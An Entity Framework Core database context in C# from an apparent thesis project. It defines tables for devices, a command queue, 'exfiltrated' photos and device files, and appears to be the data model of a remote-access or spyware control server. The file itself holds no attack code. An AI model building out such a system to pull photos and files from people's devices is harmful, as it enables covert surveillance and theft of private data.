using Microsoft.EntityFrameworkCore;
using tesis.Models;

namespace tesis.Data
{
    public class ApplicationDbContext : DbContext
    {
        public ApplicationDbContext(DbContextOptions<ApplicationDbContext> options) : base(options)
        {
        }

        public DbSet<Device> Devices { get; set; }
        public DbSet<CommandQueue> CommandQueue { get; set; }
        public DbSet<ExfiltratedPhoto> ExfiltratedPhotos { get; set; }

        // AGREGA ESTA LÍNEA PARA EL EXPLORADOR DE ARCHIVOS
        public DbSet<DeviceFile> DeviceFiles { get; set; }

        protected override void OnModelCreating(ModelBuilder modelBuilder)
        {
            base.OnModelCreating(modelBuilder);

            // Configuración opcional: Asegura que el nombre de la tabla sea exacto al SQL
            modelBuilder.Entity<DeviceFile>().ToTable("device_files");
        }
    }
}